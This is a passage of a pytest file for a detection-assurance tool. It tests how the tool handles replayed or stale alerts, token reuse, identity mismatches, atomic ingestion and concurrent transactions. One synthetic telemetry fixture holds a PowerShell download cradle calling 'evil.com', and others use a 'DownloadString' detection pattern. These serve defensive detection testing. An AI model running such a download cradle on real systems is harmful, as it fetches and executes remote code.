"""Phase 14: End-to-End Evidence Integrity & Replay Resilience Adversarial Integration Tests.

Validates:
1. Alert replay & pre-execution rejection (stale alerts preceding execution never produce PASS).
2. Token reuse across overlapping runs (same token on different or same host -> INCONCLUSIVE).
3. Temporal ordering and timestamp anomalies (out-of-order arrival, missing timestamps).
4. Identity mismatches (wrong-host, wrong-rule, wrong-user, wrong-destination, wrong-file).
5. Partial batches and atomic rollback (duplicate IDs, invalid schema, storage exceptions).
6. Cross-backend storage parity (InMemoryStore vs SQLiteStore deterministic outcomes).
7. Late vs missing telemetry distinction (EXPECTED_TELEMETRY_MISSING vs INCONCLUSIVE).
8. Normalisation boundaries and malformed/conflicting payload resilience.
9. Deduplication and repeated ingestion idempotence.
10. Concurrent transaction isolation and thread safety.
"""

import concurrent.futures
from datetime import datetime, timedelta, timezone
from pathlib import Path
import threading
import time
from typing import Any, Dict, List
import pytest
from fastapi.testclient import TestClient

from proofshield.config import reset_settings
from proofshield.main import create_application
from proofshield.normalisation.engine import (
    NormalisationEngine,
    extract_execution_token,
)
from proofshield.schemas import (
    AlertV1,
    AttributionStatus,
    DetectionRuleV1,
    DiagnosticCategory,
    EventCategory,
    ExecutionMode,
    ExecutionStatus,
    FailureCategory,
    NormalizedTelemetryEventV1,
    RawTelemetryEventV1,
    ScenarioV1,
    TestRunV1,
    ValidationTarget,
)
from proofshield.services.evaluation import AssuranceEngine
from proofshield.services.sqlite_store import SQLiteStore
from proofshield.services.store import InMemoryStore, get_store, reset_store


@pytest.fixture
def base_adv_fixtures():
    """Base scenario, rule, and timestamps for adversarial test cases."""
    t0 = datetime(2026, 10, 25, 12, 0, 0, 0, tzinfo=timezone.utc)
    scn = ScenarioV1(
        scenario_id="SCN-ADV-P14",
        name="Phase 14 Adversarial Verification Scenario",
        mitre_technique_id="T1059.001",
        mitre_tactic="Execution",
        expected_event_category=EventCategory.PROCESS_CREATION,
        expected_process_name="powershell.exe",
        expected_command_pattern=r"DownloadString",
        expected_detection_rule_id="RULE-SIGMA-ADV-14",
        validation_target=ValidationTarget.EXPECTED_ALERT,
        max_acceptable_latency_seconds=300,
    )
    rule = DetectionRuleV1(
        rule_id=scn.expected_detection_rule_id,
        rule_name="PowerShell Execution Rule",
        rule_format="sigma",
        mitre_technique_ids=["T1059.001"],
    )
    return scn, rule, t0


# ── 1. Alert Replay & Pre-Execution Alert Rejection ───────────────────────────


def test_pre_execution_alert_rejected_in_default_mode(base_adv_fixtures):
    """An alert timestamped prior to run.executed_at must NEVER produce PASS in default mode."""
    scn, rule, t0 = base_adv_fixtures
    store = InMemoryStore()
    store.add_scenario(scn)
    store.add_rule(rule)

    # Observation window starts at t0, but execution commenced at t0 + 10m
    run = TestRunV1(
        run_id="RUN-PRE-EXEC-DEF",
        scenario_id=scn.scenario_id,
        execution_mode=ExecutionMode.SYNTHETIC_SIMULATION,
        target_host="WS-ADV-01",
        target_user="secops",
        window_start=t0,
        window_end=t0 + timedelta(minutes=20),
        executed_at=t0 + timedelta(minutes=10),
    )
    store.add_run(run)

    # Valid telemetry during execution (t0 + 12m)
    ev = NormalizedTelemetryEventV1(
        normalized_event_id="NORM-PRE-01",
        raw_event_id="RAW-PRE-01",
        source_event_id="SRC-P1",
        source_timestamp=t0 + timedelta(minutes=12),
        normalized_timestamp=t0 + timedelta(minutes=12),
        event_category=EventCategory.PROCESS_CREATION,
        host=run.target_host,
        process_name="powershell.exe",
        command_line="powershell.exe DownloadString('http://evil.com/p')",
    )
    store.add_normalized_event(ev)

    # Stale/replayed alert generated at t0 + 5m (predates executed_at = t0 + 10m)
    stale_alert = AlertV1(
        alert_id="ALT-STALE-PRE-01",
        source_alert_id="SRC-A-STALE",
        source_type="sigma",
        alert_timestamp=t0 + timedelta(minutes=5),
        host_id=run.target_host,
        rule_reference=scn.expected_detection_rule_id,
    )
    store.add_alert(stale_alert)

    engine = AssuranceEngine(store)
    res = engine.evaluate_run(run.run_id, strict_attribution=False)

    # Must NOT produce PASS; alert occurred before test execution
    assert res.predicted_category != DiagnosticCategory.PASS
    assert res.predicted_category == DiagnosticCategory.ALERT_NOT_CORRELATED
    assert stale_alert.alert_id not in res.supporting_evidence_ids


def test_stale_alert_replay_from_past_run_cannot_produce_pass(base_adv_fixtures):
    """An alert from an earlier execution must never satisfy a later execution in strict mode."""
    scn, rule, t0 = base_adv_fixtures
    store = InMemoryStore()
    store.add_scenario(scn)
    store.add_rule(rule)

    # Run 1 ran at t0
    run1 = TestRunV1(
        run_id="RUN-PAST-01",
        scenario_id=scn.scenario_id,
        execution_mode=ExecutionMode.SYNTHETIC_SIMULATION,
        target_host="WS-ADV-01",
        target_user="secops",
        window_start=t0,
        window_end=t0 + timedelta(minutes=15),
        executed_at=t0,
        execution_token="TOK-PAST-01",
    )
    store.add_run(run1)

    alt_past = AlertV1(
        alert_id="ALT-PAST-01",
        source_alert_id="SRC-PAST-01",
        source_type="sigma",
        alert_timestamp=t0 + timedelta(minutes=3),
        host_id=run1.target_host,
        rule_reference=scn.expected_detection_rule_id,
        execution_token="TOK-PAST-01",
    )
    store.add_alert(alt_past)

    # Run 2 runs 2 hours later with new token
    t_run2 = t0 + timedelta(hours=2)
    run2 = TestRunV1(
        run_id="RUN-LATER-02",
        scenario_id=scn.scenario_id,
        execution_mode=ExecutionMode.SYNTHETIC_SIMULATION,
        target_host="WS-ADV-01",
        target_user="secops",
        window_start=t_run2,
        window_end=t_run2 + timedelta(minutes=15),
        executed_at=t_run2,
        execution_token="TOK-LATER-02",
    )
    store.add_run(run2)

    ev_run2 = NormalizedTelemetryEventV1(
        normalized_event_id="NORM-RUN2-01",
        raw_event_id="RAW-R2",
        source_event_id="SRC-R2",
        source_timestamp=t_run2 + timedelta(minutes=2),
        normalized_timestamp=t_run2 + timedelta(minutes=2),
        event_category=EventCategory.PROCESS_CREATION,
        host=run2.target_host,
        process_name="powershell.exe",
        command_line="powershell.exe DownloadString",
        execution_token="TOK-LATER-02",
    )
    store.add_normalized_event(ev_run2)

    engine = AssuranceEngine(store)
    res_run2 = engine.evaluate_run(run2.run_id, strict_attribution=True)

    # Detection rule did not fire for Run 2; replayed past alert must not produce PASS
    assert res_run2.predicted_category == DiagnosticCategory.DETECTION_NOT_TRIGGERED
    assert res_run2.predicted_category != DiagnosticCategory.PASS
    assert alt_past.alert_id not in res_run2.supporting_evidence_ids


# ── 2. Cross-Host & Cross-Run Token Reuse ─────────────────────────────────────


def test_cross_host_token_reuse_diagnosed_as_inconclusive(base_adv_fixtures):
    """When the same token is reused across distinct runs on different hosts with overlapping windows,

    strict attribution must return INCONCLUSIVE (conflict), never ALERT_NOT_CORRELATED.
    """
    scn, rule, t0 = base_adv_fixtures
    store = InMemoryStore()
    store.add_scenario(scn)
    store.add_rule(rule)
    reused_token = "TOK-CROSS-HOST-REUSE"

    # Run 1 on Host 1
    run1 = TestRunV1(
        run_id="RUN-HOST-01",
        scenario_id=scn.scenario_id,
        execution_mode=ExecutionMode.SYNTHETIC_SIMULATION,
        target_host="WS-ALPHA-01",
        target_user="secops",
        window_start=t0,
        window_end=t0 + timedelta(minutes=15),
        executed_at=t0,
        execution_token=reused_token,
    )
    # Run 2 on Host 2 with same token and overlapping window
    run2 = TestRunV1(
        run_id="RUN-HOST-02",
        scenario_id=scn.scenario_id,
        execution_mode=ExecutionMode.SYNTHETIC_SIMULATION,
        target_host="WS-BETA-02",
        target_user="secops",
        window_start=t0,
        window_end=t0 + timedelta(minutes=15),
        executed_at=t0 + timedelta(minutes=2),
        execution_token=reused_token,
    )
    store.add_run(run1)
    store.add_run(run2)

    # Telemetry on both hosts
    ev1 = NormalizedTelemetryEventV1(
        normalized_event_id="NORM-ALPHA-01",
        raw_event_id="RAW-A1",
        source_event_id="SRC-A1",
        source_timestamp=t0 + timedelta(minutes=3),
        normalized_timestamp=t0 + timedelta(minutes=3),
        event_category=EventCategory.PROCESS_CREATION,
        host=run1.target_host,
        process_name="powershell.exe",
        command_line="powershell.exe DownloadString",
        execution_token=reused_token,
    )
    ev2 = NormalizedTelemetryEventV1(
        normalized_event_id="NORM-BETA-02",
        raw_event_id="RAW-B2",
        source_event_id="SRC-B2",
        source_timestamp=t0 + timedelta(minutes=4),
        normalized_timestamp=t0 + timedelta(minutes=4),
        event_category=EventCategory.PROCESS_CREATION,
        host=run2.target_host,
        process_name="powershell.exe",
        command_line="powershell.exe DownloadString",
        execution_token=reused_token,
    )
    store.add_normalized_event(ev1)
    store.add_normalized_event(ev2)

    # Alert generated on Host 1 only
    alt1 = AlertV1(
        alert_id="ALT-ALPHA-01",
        source_alert_id="SRC-ALT-A1",
        source_type="sigma",
        alert_timestamp=t0 + timedelta(minutes=5),
        host_id=run1.target_host,
        rule_reference=scn.expected_detection_rule_id,
        execution_token=reused_token,
    )
    store.add_alert(alt1)

    engine = AssuranceEngine(store)
    res_run2 = engine.evaluate_run(run2.run_id, strict_attribution=True)

    # Must be diagnosed as INCONCLUSIVE due to token reuse across overlapping runs
    assert res_run2.predicted_category == DiagnosticCategory.INCONCLUSIVE
    assert res_run2.predicted_category != DiagnosticCategory.ALERT_NOT_CORRELATED
    assert res_run2.predicted_category != DiagnosticCategory.PASS
    assert "reused" in res_run2.reason.lower()
    assert res_run2.metadata["attribution"]["status"] == AttributionStatus.CONFLICT.value


# ── 3. Temporal Ordering & Invalid Timestamps ─────────────────────────────────


def test_out_of_order_telemetry_and_alert_arrival(base_adv_fixtures):
    """Telemetry and alerts ingested out of chronological order must evaluate deterministically."""
    scn, rule, t0 = base_adv_fixtures
    tok = "TOK-CHRONO-01"

    run = TestRunV1(
        run_id="RUN-CHRONO-01",
        scenario_id=scn.scenario_id,
        execution_mode=ExecutionMode.SYNTHETIC_SIMULATION,
        target_host="WS-CHRONO-01",
        target_user="secops",
        window_start=t0,
        window_end=t0 + timedelta(minutes=20),
        executed_at=t0,
        execution_token=tok,
    )

    ev_early = NormalizedTelemetryEventV1(
        normalized_event_id="NORM-EV-EARLY",
        raw_event_id="RAW-E",
        source_event_id="SRC-E",
        source_timestamp=t0 + timedelta(minutes=2),
        normalized_timestamp=t0 + timedelta(minutes=2),
        event_category=EventCategory.PROCESS_CREATION,
        host=run.target_host,
        process_name="powershell.exe",
        command_line="powershell.exe DownloadString",
        execution_token=tok,
    )
    ev_late = NormalizedTelemetryEventV1(
        normalized_event_id="NORM-EV-LATE",
        raw_event_id="RAW-L",
        source_event_id="SRC-L",
        source_timestamp=t0 + timedelta(minutes=6),
        normalized_timestamp=t0 + timedelta(minutes=6),
        event_category=EventCategory.PROCESS_CREATION,
        host=run.target_host,
        process_name="powershell.exe",
        command_line="powershell.exe DownloadString",
        execution_token=tok,
    )
    alt = AlertV1(
        alert_id="ALT-CHRONO-01",
        source_alert_id="SRC-C1",
        source_type="sigma",
        alert_timestamp=t0 + timedelta(minutes=4),
        host_id=run.target_host,
        rule_reference=scn.expected_detection_rule_id,
        execution_token=tok,
    )

    # Ingest in REVERSE order: alert, late event, early event
    store_rev = InMemoryStore()
    store_rev.add_scenario(scn)
    store_rev.add_rule(rule)
    store_rev.add_run(run)
    store_rev.add_alert(alt)
    store_rev.add_normalized_event(ev_late)
    store_rev.add_normalized_event(ev_early)

    # Ingest in NATURAL order: early event, alert, late event
    store_nat = InMemoryStore()
    store_nat.add_scenario(scn)
    store_nat.add_rule(rule)
    store_nat.add_run(run)
    store_nat.add_normalized_event(ev_early)
    store_nat.add_alert(alt)
    store_nat.add_normalized_event(ev_late)

    res_rev = AssuranceEngine(store_rev).evaluate_run(run.run_id, strict_attribution=True)
    res_nat = AssuranceEngine(store_nat).evaluate_run(run.run_id, strict_attribution=True)

    assert res_rev.predicted_category == res_nat.predicted_category == DiagnosticCategory.PASS
    assert res_rev.supporting_evidence_ids == res_nat.supporting_evidence_ids
    # Sorted order is deterministic
    assert res_rev.supporting_evidence_ids == ["NORM-EV-EARLY", "NORM-EV-LATE", "ALT-CHRONO-01"]


def test_missing_timestamp_alert_cannot_be_masked_by_pre_execution_alert(base_adv_fixtures):
    """An alert lacking an event timestamp must produce INCONCLUSIVE, and a stale pre-execution

    alert must not mask it as a valid timestamped alert.
    """
    scn, rule, t0 = base_adv_fixtures
    store = InMemoryStore()
    store.add_scenario(scn)
    store.add_rule(rule)

    run = TestRunV1(
        run_id="RUN-NO-TS-01",
        scenario_id=scn.scenario_id,
        execution_mode=ExecutionMode.SYNTHETIC_SIMULATION,
        target_host="WS-NOTS-01",
        target_user="secops",
        window_start=t0,
        window_end=t0 + timedelta(minutes=20),
        executed_at=t0 + timedelta(minutes=10),
    )
    store.add_run(run)

    ev = NormalizedTelemetryEventV1(
        normalized_event_id="NORM-NOTS-01",
        raw_event_id="RAW-N1",
        source_event_id="SRC-N1",
        source_timestamp=t0 + timedelta(minutes=12),
        normalized_timestamp=t0 + timedelta(minutes=12),
        event_category=EventCategory.PROCESS_CREATION,
        host=run.target_host,
        process_name="powershell.exe",
        command_line="powershell.exe DownloadString",
    )
    store.add_normalized_event(ev)

    # Candidate alert on host lacking event timestamp
    alt_no_ts = AlertV1(
        alert_id="ALT-NO-TS-99",
        source_alert_id="SRC-NOTS-99",
        source_type="sigma",
        alert_timestamp=None,
        host_id=run.target_host,
        rule_reference=scn.expected_detection_rule_id,
    )
    # Stale pre-execution alert
    alt_pre = AlertV1(
        alert_id="ALT-PRE-STALE-99",
        source_alert_id="SRC-PRE-99",
        source_type="sigma",
        alert_timestamp=t0 + timedelta(minutes=3),
        host_id=run.target_host,
        rule_reference=scn.expected_detection_rule_id,
    )
    store.add_alert(alt_no_ts)
    store.add_alert(alt_pre)

    engine = AssuranceEngine(store)
    res = engine.evaluate_run(run.run_id, strict_attribution=False)

    # Must be INCONCLUSIVE because valid timestamped alert during execution does not exist
    assert res.predicted_category == DiagnosticCategory.INCONCLUSIVE
    assert res.predicted_category != DiagnosticCategory.PASS


# ── 4. Identity Mismatches ────────────────────────────────────────────────────


def test_identity_mismatches_cannot_satisfy_signature(base_adv_fixtures):
    """Verify wrong-host, wrong-rule, wrong-user, wrong-destination, and wrong-file

    evidence cannot satisfy scenario requirements.
    """
    _, rule, t0 = base_adv_fixtures
    target_host = "WS-TARGET-LEGIT"

    # Multi-dimensional scenario requiring specific host, user, process, file, ip, and port
    scn = ScenarioV1(
        scenario_id="SCN-STRICT-ID-01",
        name="Strict Identity Validation Scenario",
        mitre_technique_id="T1059.001",
        mitre_tactic="Execution",
        expected_event_category=EventCategory.PROCESS_CREATION,
        expected_process_name="powershell.exe",
        expected_command_pattern=r"DownloadString",
        expected_user="CORP\\secops",
        expected_file_path="c:/tools/payload.ps1",
        expected_destination_ip="10.200.1.50",
        expected_destination_port=8443,
        expected_detection_rule_id=rule.rule_id,
        validation_target=ValidationTarget.EXPECTED_ALERT,
    )

    run = TestRunV1(
        run_id="RUN-ID-01",
        scenario_id=scn.scenario_id,
        execution_mode=ExecutionMode.SYNTHETIC_SIMULATION,
        target_host=target_host,
        target_user="CORP\\secops",
        window_start=t0,
        window_end=t0 + timedelta(minutes=15),
        executed_at=t0,
    )

    mismatch_cases = [
        ("wrong_host", {"host": "WS-WRONG-HOST"}),
        ("wrong_user", {"user": "OTHERCORP\\secops"}),
        ("wrong_file_prefix", {"extra_attributes": {"TargetFilename": "c:/tools/evil_payload.ps1"}}),
        ("wrong_dest_ip", {"network_destination_ip": "10.200.1.99"}),
        ("wrong_dest_port", {"network_destination_port": 443}),
    ]

    for label, override_fields in mismatch_cases:
        store = InMemoryStore()
        store.add_scenario(scn)
        store.add_rule(rule)
        store.add_run(run)

        kwargs = {
            "normalized_event_id": f"NORM-MISMATCH-{label}",
            "raw_event_id": f"RAW-{label}",
            "source_event_id": f"SRC-{label}",
            "source_timestamp": t0 + timedelta(minutes=2),
            "normalized_timestamp": t0 + timedelta(minutes=2),
            "event_category": EventCategory.PROCESS_CREATION,
            "host": target_host,
            "user": "CORP\\secops",
            "process_name": "powershell.exe",
            "command_line": "powershell.exe DownloadString",
            "network_destination_ip": "10.200.1.50",
            "network_destination_port": 8443,
            "extra_attributes": {"TargetFilename": "c:/tools/payload.ps1"},
        }
        kwargs.update(override_fields)

        ev = NormalizedTelemetryEventV1(**kwargs)
        store.add_normalized_event(ev)

        # Correlated alert is present
        alt = AlertV1(
            alert_id=f"ALT-ID-{label}",
            source_alert_id=f"SRC-ALT-{label}",
            source_type="sigma",
            alert_timestamp=t0 + timedelta(minutes=3),
            host_id=target_host,
            rule_reference=rule.rule_id,
        )
        store.add_alert(alt)

        engine = AssuranceEngine(store)
        res = engine.evaluate_run(run.run_id)

        # Mismatch must prevent false PASS -> EXPECTED_TELEMETRY_MISSING
        assert res.predicted_category == DiagnosticCategory.EXPECTED_TELEMETRY_MISSING, (
            f"Case {label} unexpectedly succeeded with {res.predicted_category}"
        )


# ── 5. Partial Batches & Atomic Rollback ───────────────────────────────────────


def test_jsonl_atomic_ingestion_rollback_on_duplicate_and_error(tmp_path: Path):
    """When atomic=True, any duplicate ID or persistence failure must roll back all records."""
    reset_store()
    reset_settings()
    app = create_application()
    client = TestClient(app)

    # 3 lines of raw telemetry; line 1 and line 3 have duplicate raw_event_id
    t0_iso = datetime.now(timezone.utc).isoformat()
    line1 = f'{{"raw_event_id": "RAW-ATOMIC-01", "source_event_id": "S1", "source_format": "sysmon", "source_timestamp": "{t0_iso}", "ingested_at": "{t0_iso}", "raw_payload": {{"msg": "one"}}}}'
    line2 = f'{{"raw_event_id": "RAW-ATOMIC-02", "source_event_id": "S2", "source_format": "sysmon", "source_timestamp": "{t0_iso}", "ingested_at": "{t0_iso}", "raw_payload": {{"msg": "two"}}}}'
    line3 = f'{{"raw_event_id": "RAW-ATOMIC-01", "source_event_id": "S3", "source_format": "sysmon", "source_timestamp": "{t0_iso}", "ingested_at": "{t0_iso}", "raw_payload": {{"msg": "dup"}}}}'

    content = f"{line1}\n{line2}\n{line3}"

    payload = {
        "schema_type": "raw_telemetry",
        "content": content,
        "store": True,
        "atomic": True,
    }

    res = client.post("/api/v1/ingest/jsonl", json=payload)
    assert res.status_code == 200
    data = res.json()

    assert not data["is_valid"]
    assert not data["stored"]
    assert data["persisted_count"] == 0
    assert any("Atomic batch insertion aborted" in e["error_message"] for e in data["errors"])

    # Verify zero records committed
    store = get_store()
    assert store.get_raw_event("RAW-ATOMIC-01") is None
    assert store.get_raw_event("RAW-ATOMIC-02") is None
    assert len(store.list_raw_events()) == 0


def test_jsonl_best_effort_ingestion_persists_valid_records():
    """When atomic=False, valid records persist while invalid records are reported."""
    reset_store()
    reset_settings()
    app = create_application()
    client = TestClient(app)

    t0_iso = datetime.now(timezone.utc).isoformat()
    line1 = f'{{"raw_event_id": "RAW-BEST-01", "source_event_id": "S1", "source_format": "sysmon", "source_timestamp": "{t0_iso}", "ingested_at": "{t0_iso}", "raw_payload": {{"msg": "one"}}}}'
    line2 = f'{{"raw_event_id": "RAW-BEST-02", "source_event_id": "S2", "source_format": "sysmon", "source_timestamp": "{t0_iso}", "ingested_at": "{t0_iso}", "raw_payload": {{"msg": "two"}}}}'
    line3 = f'{{"raw_event_id": "RAW-BEST-01", "source_event_id": "S3", "source_format": "sysmon", "source_timestamp": "{t0_iso}", "ingested_at": "{t0_iso}", "raw_payload": {{"msg": "dup"}}}}'

    payload = {
        "schema_type": "raw_telemetry",
        "content": f"{line1}\n{line2}\n{line3}",
        "store": True,
        "atomic": False,
    }

    res = client.post("/api/v1/ingest/jsonl", json=payload)
    assert res.status_code == 200
    data = res.json()

    assert data["stored"] is True
    assert data["persisted_count"] == 2
    assert len(data["errors"]) == 1

    store = get_store()
    assert store.get_raw_event("RAW-BEST-01") is not None
    assert store.get_raw_event("RAW-BEST-02") is not None
    assert len(store.list_raw_events()) == 2


# ── 6. Storage Parity Across Backends ──────────────────────────────────────────


def test_storage_parity_across_adversarial_matrix(tmp_path: Path, base_adv_fixtures):
    """InMemoryStore and SQLiteStore must produce 100% identical diagnosis results and metadata."""
    scn, rule, t0 = base_adv_fixtures
    tok = "TOK-PARITY-14"

    run = TestRunV1(
        run_id="RUN-PARITY-14",
        scenario_id=scn.scenario_id,
        execution_mode=ExecutionMode.SYNTHETIC_SIMULATION,
        target_host="WS-PARITY-14",
        target_user="secops",
        window_start=t0,
        window_end=t0 + timedelta(minutes=15),
        executed_at=t0,
        execution_token=tok,
    )
    ev = NormalizedTelemetryEventV1(
        normalized_event_id="NORM-PARITY-14",
        raw_event_id="RAW-P14",
        source_event_id="SRC-P14",
        source_timestamp=t0 + timedelta(minutes=2),
        normalized_timestamp=t0 + timedelta(minutes=2),
        event_category=EventCategory.PROCESS_CREATION,
        host=run.target_host,
        process_name="powershell.exe",
        command_line="powershell.exe DownloadString",
        execution_token=tok,
    )
    alt = AlertV1(
        alert_id="ALT-PARITY-14",
        source_alert_id="SRC-AP14",
        source_type="sigma",
        alert_timestamp=t0 + timedelta(minutes=3),
        host_id=run.target_host,
        rule_reference=rule.rule_id,
        execution_token=tok,
    )

    db_path = tmp_path / "parity_adv.db"
    mem_store = InMemoryStore()
    sql_store = SQLiteStore(db_path)

    try:
        for s in (mem_store, sql_store):
            s.add_scenario(scn)
            s.add_rule(rule)
            s.add_run(run)
            s.add_normalized_event(ev)
            s.add_alert(alt)

        mem_diag = AssuranceEngine(mem_store).evaluate_run(run.run_id, strict_attribution=True)
        sql_diag = AssuranceEngine(sql_store).evaluate_run(run.run_id, strict_attribution=True)

        assert mem_diag.predicted_category == sql_diag.predicted_category == DiagnosticCategory.PASS
        assert mem_diag.confidence == sql_diag.confidence == "definitive"
        assert mem_diag.supporting_evidence_ids == sql_diag.supporting_evidence_ids
        assert mem_diag.metadata["attribution"] == sql_diag.metadata["attribution"]
    finally:
        sql_store.close()


# ── 7. Late & Missing Telemetry Boundaries ────────────────────────────────────


def test_late_telemetry_excluded_from_window(base_adv_fixtures):
    """Telemetry arriving after window_end (pipeline latency) must never silently produce PASS."""
    scn, rule, t0 = base_adv_fixtures
    store = InMemoryStore()
    store.add_scenario(scn)
    store.add_rule(rule)

    run = TestRunV1(
        run_id="RUN-LATE-01",
        scenario_id=scn.scenario_id,
        execution_mode=ExecutionMode.SYNTHETIC_SIMULATION,
        target_host="WS-LATE-01",
        target_user="secops",
        window_start=t0,
        window_end=t0 + timedelta(minutes=15),
        executed_at=t0,
    )
    store.add_run(run)

    # Event generated 10 seconds past window_end
    ev_late = NormalizedTelemetryEventV1(
        normalized_event_id="NORM-LATE-01",
        raw_event_id="RAW-L1",
        source_event_id="SRC-L1",
        source_timestamp=t0 + timedelta(minutes=15, seconds=10),
        normalized_timestamp=t0 + timedelta(minutes=15, seconds=10),
        event_category=EventCategory.PROCESS_CREATION,
        host=run.target_host,
        process_name="powershell.exe",
        command_line="powershell.exe DownloadString",
    )
    store.add_normalized_event(ev_late)

    # Alert arrived inside window
    alt = AlertV1(
        alert_id="ALT-LATE-01",
        source_alert_id="SRC-A-L1",
        source_type="sigma",
        alert_timestamp=t0 + timedelta(minutes=5),
        host_id=run.target_host,
        rule_reference=rule.rule_id,
    )
    store.add_alert(alt)

    engine = AssuranceEngine(store)
    res = engine.evaluate_run(run.run_id)

    # Missing in-window telemetry prevents PASS -> EXPECTED_TELEMETRY_MISSING
    assert res.predicted_category == DiagnosticCategory.EXPECTED_TELEMETRY_MISSING
    assert res.predicted_category != DiagnosticCategory.PASS


# ── 8. Normalisation Boundaries & Conflicting Extraction ──────────────────────


def test_normalisation_resilience_against_malformed_and_conflicting_payloads():
    """Verify extract_execution_token and NormalisationEngine survive non-string keys,

    empty fields, and conflicting explicit vs extracted tokens.
    """
    # 1. Non-string keys in payload must not crash extract_execution_token
    payload_int_keys: Dict[Any, Any] = {
        123: "unrelated",
        "execution_token": "TOK-VALID-01",
        456: None,
    }
    extracted = extract_execution_token(payload=payload_int_keys)
    assert extracted == "TOK-VALID-01"

    # 2. Conflicting explicit vs structured payload token -> CONFLICT
    conflicting = extract_execution_token(
        payload={"execution_token": "TOK-A"},
        explicit_token="TOK-B",
    )
    assert conflicting == "CONFLICT"

    # 3. Conflicting structured vs unstructured text token -> CONFLICT
    conflict_text = extract_execution_token(
        payload={"execution_token": "TOK-A"},
        text_fields=["powershell.exe [TOKEN:TOK-B]"],
    )
    assert conflict_text == "CONFLICT"

    # 4. Fallback normaliser with non-standard payload
    engine = NormalisationEngine()
    t0 = datetime.now(timezone.utc)
    raw = RawTelemetryEventV1(
        raw_event_id="RAW-ODD-01",
        source_event_id="SRC-ODD-01",
        source_format="custom_edr_unregistered",
        source_timestamp=t0,
        ingested_at=t0,
        raw_payload={"host": "WS-FALLBACK-01", "cmdline": "calc.exe [TOKEN:TOK-FALLBACK-99]"},
    )
    norm = engine.normalize(raw)
    assert norm.host == "WS-FALLBACK-01"
    assert norm.execution_token == "TOK-FALLBACK-99"


# ── 9. Deduplication & Replay Semantics ────────────────────────────────────────


def test_deduplication_and_repeated_ingestion_outcome_stability(base_adv_fixtures):
    """Repeated ingestion of identical evidence under distinct IDs must not alter diagnosis outcome."""
    scn, rule, t0 = base_adv_fixtures
    store = InMemoryStore()
    store.add_scenario(scn)
    store.add_rule(rule)

    run = TestRunV1(
        run_id="RUN-DEDUP-01",
        scenario_id=scn.scenario_id,
        execution_mode=ExecutionMode.SYNTHETIC_SIMULATION,
        target_host="WS-DEDUP-01",
        target_user="secops",
        window_start=t0,
        window_end=t0 + timedelta(minutes=15),
        executed_at=t0,
    )
    store.add_run(run)

    # Ingest initial evidence
    ev1 = NormalizedTelemetryEventV1(
        normalized_event_id="NORM-DEDUP-01",
        raw_event_id="RAW-D1",
        source_event_id="SRC-D1",
        source_timestamp=t0 + timedelta(minutes=2),
        normalized_timestamp=t0 + timedelta(minutes=2),
        event_category=EventCategory.PROCESS_CREATION,
        host=run.target_host,
        process_name="powershell.exe",
        command_line="powershell.exe DownloadString",
    )
    alt1 = AlertV1(
        alert_id="ALT-DEDUP-01",
        source_alert_id="SRC-AD1",
        source_type="sigma",
        alert_timestamp=t0 + timedelta(minutes=3),
        host_id=run.target_host,
        rule_reference=rule.rule_id,
    )
    store.add_normalized_event(ev1)
    store.add_alert(alt1)

    engine = AssuranceEngine(store)
    res_single = engine.evaluate_run(run.run_id)
    assert res_single.predicted_category == DiagnosticCategory.PASS

    # Ingest 3 duplicate replayed events and alerts (at-least-once streaming replay)
    for i in range(2, 5):
        store.add_normalized_event(
            NormalizedTelemetryEventV1(
                normalized_event_id=f"NORM-DEDUP-{i:02d}",
                raw_event_id=f"RAW-D{i}",
                source_event_id="SRC-D1",
                source_timestamp=t0 + timedelta(minutes=2),
                normalized_timestamp=t0 + timedelta(minutes=2),
                event_category=EventCategory.PROCESS_CREATION,
                host=run.target_host,
                process_name="powershell.exe",
                command_line="powershell.exe DownloadString",
            )
        )
        store.add_alert(
            AlertV1(
                alert_id=f"ALT-DEDUP-{i:02d}",
                source_alert_id="SRC-AD1",
                source_type="sigma",
                alert_timestamp=t0 + timedelta(minutes=3),
                host_id=run.target_host,
                rule_reference=rule.rule_id,
            )
        )

    res_replayed = engine.evaluate_run(run.run_id)

    # Verdict must remain PASS; evidence count expands predictably and traceably
    assert res_replayed.predicted_category == DiagnosticCategory.PASS
    assert len(res_replayed.supporting_evidence_ids) == 8  # 4 events + 4 alerts
    assert "NORM-DEDUP-01" in res_replayed.supporting_evidence_ids
    assert "ALT-DEDUP-01" in res_replayed.supporting_evidence_ids


# ── 10. Concurrent Transaction Isolation & Rollback Parity ────────────────────


def test_concurrent_store_transaction_rollback_isolation(tmp_path: Path):
    """Simultaneous transactions across multiple threads must maintain isolation:

    a rolled-back transaction must never erase concurrent committed entries on either backend.
    """
    for backend_name, store in [
        ("in_memory", InMemoryStore()),
        ("sqlite", SQLiteStore(tmp_path / "concurrent_tx.db")),
    ]:
        def worker(idx: int):
            try:
                with store.transaction():
                    store.add_scenario(
                        ScenarioV1(
                            scenario_id=f"SCN-CONC-{idx:03d}",
                            name=f"Scenario {idx}",
                            mitre_technique_id="T1059.001",
                            mitre_tactic="Execution",
                            expected_event_category=EventCategory.PROCESS_CREATION,
                            validation_target=ValidationTarget.EXPECTED_ALERT,
                        )
                    )
                    time.sleep(0.002)
                    if idx % 2 == 0:
                        raise ValueError(f"Intentional rollback {idx}")
            except ValueError:
                pass

        with concurrent.futures.ThreadPoolExecutor(max_workers=8) as executor:
            list(executor.map(worker, range(20)))

        all_scenarios = store.list_scenarios()
        committed_ids = {s.scenario_id for s in all_scenarios}

        # 10 odd transactions should commit; 10 even transactions should cleanly roll back
        assert len(committed_ids) == 10, (
            f"Concurrency defect on {backend_name}: expected 10 committed scenarios, got {len(committed_ids)}"
        )
        for i in range(20):
            scn_id = f"SCN-CONC-{i:03d}"
            if i % 2 == 0:
                assert scn_id not in committed_ids, f"Rolled back {scn_id} persisted in {backend_name}"
            else:
                assert scn_id in committed_ids, f"Committed {scn_id} missing in {backend_name}"

        store.reset()
        if hasattr(store, "close"):
            store.close()


def test_in_memory_store_concurrent_tx_rollback_deterministic():
    """Verify concurrent transactions with deterministic events:
    Thread 1 starts tx and rolls back; Thread 2 starts tx and commits.
    Rollback in Thread 1 must never erase Thread 2's committed scenario.
    """
    store = InMemoryStore()
    t1_inside = threading.Event()
    t2_blocked = threading.Event()

    def thread1_worker():
        try:
            with store.transaction():
                store.add_scenario(
                    ScenarioV1(
                        scenario_id="SCN-TX1-FAIL",
                        name="Scenario TX1",
                        mitre_technique_id="T1059.001",
                        mitre_tactic="Execution",
                        expected_event_category=EventCategory.PROCESS_CREATION,
                        validation_target=ValidationTarget.EXPECTED_ALERT,
                    )
                )
                t1_inside.set()
                t2_blocked.wait(timeout=2.0)
                raise ValueError("Thread 1 deliberate rollback")
        except ValueError:
